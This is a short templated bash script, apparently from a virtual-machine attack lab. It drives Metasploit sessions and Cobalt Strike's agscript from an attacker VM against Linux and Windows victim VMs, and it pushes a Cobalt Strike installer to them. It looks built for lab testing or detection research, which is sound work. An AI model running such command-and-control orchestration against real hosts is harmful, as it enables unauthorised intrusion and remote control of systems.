#!/bin/bash
cs_server={{ attacker.ip }}
cs_pwd={{ attacker.team_server_pwd }}
cs_port={{ attacker.team_server_port }}

{% for vm, vmd in victim.items() %}
{%- if vmd.platform == 'linux' %}
c2script=msf-c2cmd-{{ vm }}
cat << EOF > $c2script
lpwd
lls
pwd
ls
download /vagrant/{{ dependencies['cs_installer'] }}
lls
EOF

vagrant ssh attacker -c 'tmux send -t {{ vm }}:0 "run /vagrant/$c2script" ENTER'

{%- elif vmd.platform == 'windows' %}

vagrant ssh attacker -c 'tmux new-window -t cobaltstrike -n {{ vm }} "cd Cobaltstrike-4.4 && ./agscript $cs_server $cs_port {{ vm }} $cs_pwd /vagrant/commands.cna"' 

{%- else %}
Invalid platform: {{ vmd.platform }}
{%- endif %}

{% endfor %}
